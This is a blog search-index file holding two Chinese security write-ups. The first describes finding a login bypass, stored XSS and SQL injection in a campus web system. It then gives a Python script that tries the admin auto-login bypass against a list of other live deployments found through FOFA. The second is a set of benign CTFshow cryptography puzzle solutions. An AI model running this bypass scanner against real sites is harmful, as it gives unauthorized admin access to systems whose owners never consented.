<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记一次校园网站漏洞通杀</title>
      <link href="/post/5c020f8dd96c445d868e1f15627be035/"/>
      <url>/post/5c020f8dd96c445d868e1f15627be035/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞挖掘"><a href="#一、漏洞挖掘" class="headerlink" title="一、漏洞挖掘"></a>一、漏洞挖掘</h1><h2 id="1、逻辑缺陷"><a href="#1、逻辑缺陷" class="headerlink" title="1、逻辑缺陷"></a>1、逻辑缺陷</h2><p>熟悉的页面，熟悉的弱口令测试，但无果</p><p><img src="https://s1.vika.cn/space/2023/02/19/5c020f8dd96c445d868e1f15627be035" alt=" "></p><p>我就把目光转向js审计，果不其然有新发现，可以根据账号自动登录</p><p><img src="https://s1.vika.cn/space/2023/02/19/0dd7c2b378734ca0bda95dc0e0215536" alt=" "></p><p>于是直接构造请求绕过登录</p><p><img src="https://s1.vika.cn/space/2023/02/19/0bf4d4a99a3041808ab9a06adea1b97a" alt=" "></p><p>经典的管理员权限</p><h2 id="2、存储型XSS"><a href="#2、存储型XSS" class="headerlink" title="2、存储型XSS"></a>2、存储型XSS</h2><p>寻找文本输入</p><p><img src="https://s1.vika.cn/space/2023/02/19/90ae44597e6443ec8ca3ebde71ee08e9" alt=" "></p><p>浅析：<br>前端：这里的标签都是普通标签，没有像<code>RCDATA</code>元素(<code>RCDATA elements</code>)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>，会做一次HTML编码，所以可以直接插入危险的js代码。<br>后端：没有任何过滤（笑~</p><p><img src="https://s1.vika.cn/space/2023/02/19/fd1d908a3fea4a05a9a84be1652de68a" alt=" "></p><p>所以就简单了，直接插入<code>&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code>即可</p><p><img src="https://s1.vika.cn/space/2023/02/19/e7ddff1b935545b587a222a9a1df3a97" alt=" "></p><h2 id="3、SQL注入"><a href="#3、SQL注入" class="headerlink" title="3、SQL注入"></a>3、SQL注入</h2><p><img src="https://s1.vika.cn/space/2023/02/19/5e4ad3ca5a354b5e9f5dc0bdb7255947" alt=" "></p><p>测试无果</p><p><img src="https://s1.vika.cn/space/2023/02/19/0503329962164003b63bae6229d1262d" alt=" "></p><p>最后发现注入点在第一个函数，果然任何一个输入点都是不安全的，是布尔型盲注</p><p><img src="https://s1.vika.cn/space/2023/02/19/288bb9ed8d6d4fcb8e419fba270e20d6" alt=" "></p><p>后面就是经典Sqlmap了</p><p><img src="https://s1.vika.cn/space/2023/02/19/5c86dc60348b48e2899ccfd4a5456121" alt=" "></p><h1 id="二、继续通杀"><a href="#二、继续通杀" class="headerlink" title="二、继续通杀"></a>二、继续通杀</h1><p>根据系统指纹在fofa上搜索：<code>&quot;xx系统&quot; &amp;&amp; icon_hash=&quot;11xxxx&quot;</code><br>有32个IP，看了下，有重复的</p><p><img src="https://s1.vika.cn/space/2023/02/19/c3a1a95d8af942d1b2793b317f23323d" alt=" "></p><p>使用<a href="https://github.com/wgpsec/fofa_viewer">fofa_viewer</a>导出目标<br>这里我根据第一个逻辑漏洞的漏洞指纹信息，写了一个poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url</span>):</span><br><span class="line">    poc_url = url + <span class="string">&#x27;/login/doautologin.edu&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;um.userid&#x27;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(poc_url, data=data, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> (res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>)): <span class="comment"># 登录成功就会set-cookie</span></span><br><span class="line">            <span class="built_in">print</span>(url + <span class="string">&#x27;/login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> BaseException:  </span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            poc(i.rstrip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="三、思考总结"><a href="#三、思考总结" class="headerlink" title="三、思考总结"></a>三、思考总结</h1><p>1）在访问系统当中的时候F12查看源码是一个不错的习惯（尤其是有前端弹框的）<br>2）前端代码的一切展示行为完全可控(一定要理解这句话)<br>3）了解程序的底层逻辑，你才能更清晰的知道每一个参数的意义</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 逻辑缺陷 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow刷题-Crypto</title>
      <link href="/post/d9c1542fed784d7cb4a56bcb276d379d/"/>
      <url>/post/d9c1542fed784d7cb4a56bcb276d379d/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>各种编码的网址：<a href="https://www.cnblogs.com/ichunqiu/p/8297620.html">https://www.cnblogs.com/ichunqiu/p/8297620.html</a></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><strong>jjencode</strong></p><p><strong>jsfuck</strong>源于一门编程语言<strong>brainfuck</strong>，其主要的思想就是只使用8种特定的符号来编写代码。而jsfuck也是沿用了这个思想，它仅仅使用6种符号来编写代码。它们分别是(、)、+、[、]、!。</p><p><img src="https://s1.vika.cn/space/2023/02/22/d9c1542fed784d7cb4a56bcb276d379d" alt="image-20211006103910433"></p><p>放到控制台回车</p><p><img src="https://s1.vika.cn/space/2023/02/22/d41655fb3f6c4be6b975dc47f8b8a2e5" alt="image-20211006104103771"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>打开文本，发现是<strong>aaencode</strong>，直接在控制台执行即可得到flag</p><p>颜文字网络表情的编码</p><p>先解码再解密</p><p><a href="http://www.atoolbox.net/Tool.php?Id=703">http://www.atoolbox.net/Tool.php?Id=703</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+/*´∇｀*/(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;);</span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p><strong>RSA解码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p = <span class="number">447685307</span></span><br><span class="line">q = <span class="number">2037</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><strong>RSA非对称解密</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p = <span class="number">447685307</span></span><br><span class="line">q =  <span class="number">2037</span></span><br><span class="line">e =  <span class="number">17</span></span><br><span class="line">c =  <span class="number">704796792</span></span><br><span class="line"></span><br><span class="line">m = libnum.invmod(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">result = <span class="built_in">pow</span>(c, m, p*q)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><strong>rabbit加密</strong></p><p>密码为Rabbit</p><p><a href="http://www.jsons.cn/rabbitencrypt/">http://www.jsons.cn/rabbitencrypt/</a></p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>爆破压缩包得密码4132</p><p><img src="https://s1.vika.cn/space/2023/02/22/77952c3fa41b40fdaf642b0e6c48cc20" alt="image-20211007144122191"></p><p><strong>serpent加密</strong></p><p><a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a></p><p>选择Inout type为File上传压缩包里的文件，或者用记事本打开文件复制里面的内容，KEY&#x3D;4132，再单击“Decrypt!”解码得到flag。</p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><strong>quoted-printable编码</strong></p><p><a href="http://web.chacuo.net/charsetquotedprintable">http://web.chacuo.net/charsetquotedprintable</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=E7=94=A8=E4=BD=A0=E9=82=A3=E7=81=AB=E7=83=AD=E7=9A=84=E5=98=B4=E5=94=87=E8=AE=A9=E6=88=91=E5=9C=A8=E5=8D=88=E5=A4=9C=E9=87=8C=E6=97=A0=E5=B0=BD=E7=9A=84=E9=94=80=E9=AD=82</span><br></pre></td></tr></table></figure><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>a8db1d82db78ed452ba0882fb9554fc</p><p>只有31位的MD5,要在后面补一位</p><p><img src="https://s1.vika.cn/space/2023/02/22/4dfa76ca3e9f437cae736d6049cae51c" alt="image-20211007225533976"></p><h3 id="00"><a href="#00" class="headerlink" title="00"></a>00</h3><p>密文为gmbh{ifmmp_dug} 位移一位<br> 凯撒解密</p><p><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p><p><img src="https://s1.vika.cn/space/2023/02/22/4b935d015fe348eaa80788fa53ec1ca8" alt="image-20211006164732083"></p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p>题目： uozt{Zgyzhv_xlwv_uiln_xguhsld}<br>解题思路： 猜测uozt对应flag，u-f，o-l，z-a，t-g，正好符合<strong>埃特巴什码</strong>，解码得flag，flag{Atbase_code_from_ctfshow}，注意对应字符的大小写。</p><p><a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/</a></p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p>下载下来文档，文档名为base家族，打开文件应该为base64和base32的混合加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = base64.b32decode(s)</span><br><span class="line">        s = base(s)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = base64.b64decode(s)</span><br><span class="line">            s = base(s)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;base.txt&#x27;</span>)<span class="comment">#把文件放在同一文件下</span></span><br><span class="line"></span><br><span class="line">text = f.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base(text))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>直接将得到的二进制转成16进制，然后再转成字符串(<strong>转了两次</strong>)，得到了结果如下：3EP&#x2F;3VNFFmNEAnlHD5dCMmVHD5ad9uG，”flag”使用base64加密后的字符串是 ZmxhZw&#x3D;&#x3D; 前面的ZmxhZ不管flag后面是什么都不会改变。我们对比一下前四个字符，”Zmxh”和”3EP&#x2F;“在base64表中查一下，Z和3差了30，m和E差了30。</p><p><img src="https://s1.vika.cn/space/2023/02/22/60d4fdc0fa41419b983aded0aebd07cb" alt="image-20211010152749627"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#author 羽</span></span><br><span class="line">s= <span class="string">&#x27;3EP/3VNFFmNEAnlHD5dCMmVHD5ad9uG&#x27;</span></span><br><span class="line">t = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">l=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    l += t[(t.index(i)-<span class="number">30</span>)%<span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(l)%<span class="number">4</span>!=<span class="number">0</span>:</span><br><span class="line">    l=l+<span class="string">&quot;=&quot;</span>*(<span class="number">4</span>-(<span class="built_in">len</span>(l)%<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="萌新密码5"><a href="#萌新密码5" class="headerlink" title="萌新密码5"></a>萌新密码5</h3><p>当铺密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由田中 由田井 羊夫 由田人 由中人 羊羊 由由王 由田中 由由大 由田工 由由由 由由羊 由中大</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s =<span class="string">&#x27;田由中人工大王夫井羊&#x27;</span></span><br><span class="line">code=<span class="built_in">input</span>(<span class="string">&quot;请输入当铺密码：&quot;</span>)</span><br><span class="line">code = code.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">w = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    k=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">       k+=<span class="built_in">str</span>(s.index(j))</span><br><span class="line">    w+=<span class="built_in">chr</span>(<span class="built_in">int</span>(k))</span><br><span class="line"><span class="built_in">print</span>(w)</span><br></pre></td></tr></table></figure><h3 id="easyrsa7"><a href="#easyrsa7" class="headerlink" title="easyrsa7"></a>easyrsa7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = 0x10001</span><br><span class="line">p&gt;&gt;128&lt;&lt;128 = 0xd1c520d9798f811e87f4ff406941958bab8fc24b19a32c3ad89b0b73258ed3541e9ca696fd98ce15255264c39ae8c6e8db5ee89993fa44459410d30a0a8af700ae3aee8a9a1d6094f8c757d3b79a8d1147e85be34fb260a970a52826c0a92b46cefb5dfaf2b5a31edf867f8d34d2222900000000000000000000000000000000</span><br><span class="line">n = 0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3</span><br><span class="line">c = 0x1b2b4f9afed5fb5f9876757e959c183c2381ca73514b1918d2f123e386bebe9832835350f17ac439ac570c9b2738f924ef49afea02922981fad702012d69ea3a3c7d1fc8efc80e541ca2622d7741090b9ccd590906ac273ffcc66a7b8c0d48b7d62d6cd6dd4cd75747c55aac28f8be3249eb255d8750482ebf492692121ab4b27b275a0f69b15baef20bf812f3cbf581786128b51694331be76f80d6fb1314d8b280eaa16c767821b9c2ba05dfde5451feef22ac3cb3dfbc88bc1501765506f0c05045184292a75c475486b680f726f44ef8ddfe3c48f75bb03c8d44198ac70e6b7c885f53000654db22c8cee8eb4f65eaeea2da13887aaf53d8c254d2945691</span><br></pre></td></tr></table></figure><p>p&gt;&gt;128&lt;&lt;128代表着低位数据丢失，需要用sagemath恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">147305526294483975294006704928271118039370615054437206404408410848858740256154476278591035455064149531353089038270283281541411458250950936656537283482331598521457077465891874559349872035197398406708610440618635013091489698011474611145014167945729411970665381793142591665313979405475889978830728651549052207969</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p = 0xd1c520d9798f811e87f4ff406941958bab8fc24b19a32c3ad89b0b73258ed3541e9ca696fd98ce15255264c39ae8c6e8db5ee89993fa44459410d30a0a8af700ae3aee8a9a1d6094f8c757d3b79a8d1147e85be34fb260a970a52826c0a92b46cefb5dfaf2b5a31edf867f8d34d2222900000000000000000000000000000000</span><br><span class="line">n = 0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3</span><br><span class="line">pbits = 1024</span><br><span class="line">kbits = 128</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p</span><br><span class="line">x0 = f.small_roots(X=2^kbits,beta=0.4)[0]</span><br><span class="line">print(p+int(x0))</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/7c0d23b044ba4a3aa7d8fe7fae17c7f1" alt="image-20221104112629765"></p><p><img src="https://s1.vika.cn/space/2023/02/22/a8d9e7f513a8402bbe894dbf8254eef0" alt="image-20221029111546961"></p><p>常规解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = <span class="number">147305526294483975294006704928271118039370615054437206404408410848858740256154476278591035455064149531353089038270283281541411458250950936656537283482331598521457077465891874559349872035197398406708610440618635013091489698011474611145014167945729411970665381793142591665313979405475889978830728651549052207969</span></span><br><span class="line">n = <span class="number">0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3</span></span><br><span class="line">c = <span class="number">0x1b2b4f9afed5fb5f9876757e959c183c2381ca73514b1918d2f123e386bebe9832835350f17ac439ac570c9b2738f924ef49afea02922981fad702012d69ea3a3c7d1fc8efc80e541ca2622d7741090b9ccd590906ac273ffcc66a7b8c0d48b7d62d6cd6dd4cd75747c55aac28f8be3249eb255d8750482ebf492692121ab4b27b275a0f69b15baef20bf812f3cbf581786128b51694331be76f80d6fb1314d8b280eaa16c767821b9c2ba05dfde5451feef22ac3cb3dfbc88bc1501765506f0c05045184292a75c475486b680f726f44ef8ddfe3c48f75bb03c8d44198ac70e6b7c885f53000654db22c8cee8eb4f65eaeea2da13887aaf53d8c254d2945691</span></span><br><span class="line">q = n // p</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求逆元</span></span><br><span class="line">d = libnum.invmod(e, phi_n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 数字转字节，转字符串</span></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h3 id="easyrsa8"><a href="#easyrsa8" class="headerlink" title="easyrsa8"></a>easyrsa8</h3><p>n可以分解</p><p>libnum无法转码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 